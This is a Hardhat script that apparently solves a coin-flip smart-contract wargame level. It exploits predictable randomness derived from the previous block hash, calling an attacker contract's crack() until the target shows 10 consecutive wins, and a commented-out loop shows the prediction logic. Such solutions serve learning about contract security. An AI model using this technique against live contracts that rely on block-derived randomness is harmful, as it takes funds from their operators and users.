import hre, { ethers } from "hardhat";
    
async function main() {
    const signer = await ethers.provider.getSigner();
    // Contract setup
    const FACTOR = BigInt(57896044618658097711785492504343953926634992332820282019728792003956564819968)
    const contractAddress = "0x738523Fe53B49cD6EEe7cF70B2b60968aC8e1651"; // Replace with your contract address
    const contractABI =
      [
    {
      "type": "constructor",
      "inputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "type": "function",
      "name": "consecutiveWins",
      "inputs": [],
      "outputs": [
        {
          "name": "",
          "type": "uint256",
          "internalType": "uint256"
        }
      ],
      "stateMutability": "view",
      "constant": true,
      "signature": "0xe6f334d7"
    },
    {
      "type": "function",
      "name": "flip",
      "inputs": [
        {
          "name": "_guess",
          "type": "bool",
          "internalType": "bool"
        }
      ],
      "outputs": [
        {
          "name": "",
          "type": "bool",
          "internalType": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "signature": "0x1d263f67"
    }
  ]
  const _abi = [
    {
      inputs: [
        {
          internalType: "address",
          name: "targetContract",
          type: "address",
        },
      ],
      stateMutability: "payable",
      type: "constructor",
    },
    {
      inputs: [],
      name: "crack",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [
        {
          internalType: "address payable",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
  ] as const;
  
    const contract = new ethers.Contract("0xB7aa271B4566d7902417B2Ea121A69b51147B2ef", _abi, signer);
    const contractToCrack = new ethers.Contract(contractAddress, contractABI, signer);
  
    // // Call a function from the contract
    // for (let index = 0; index < 10; index++) {
    //   const currentBlock= await ethers.provider.getBlockNumber()
    //   const previousBlockNumber = currentBlock - 1;
        
    //   // Get the previous block details
    //   const previousBlock = await ethers.provider.getBlock(previousBlockNumber);
      
    //   // Get the hash of the previous block
    //   const previousBlockHash = BigInt(previousBlock!.hash!);
    //   const side = (previousBlockHash / FACTOR ) === 1n;

    //   console.log(side)
    //   console.log(previousBlockHash)
    //   console.log(FACTOR)
    //   const result = await contract.flip(side);
    //   const receipt = await result.wait();
    //   console.log(receipt)
    //   console.log(await contract.consecutiveWins())
    //   console.log("Result:", JSON.stringify(result.toString()));
    // }
    console.log(await contractToCrack.consecutiveWins())
    while(await contractToCrack.consecutiveWins() !== 10n){
      console.log(await contractToCrack.consecutiveWins())
      try {
        const result = await contract.crack();
        const receipt = await result.wait();
        console.log(receipt)
      }
      catch(e: any){
        console.log(e)
      }
    }
  }


  main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
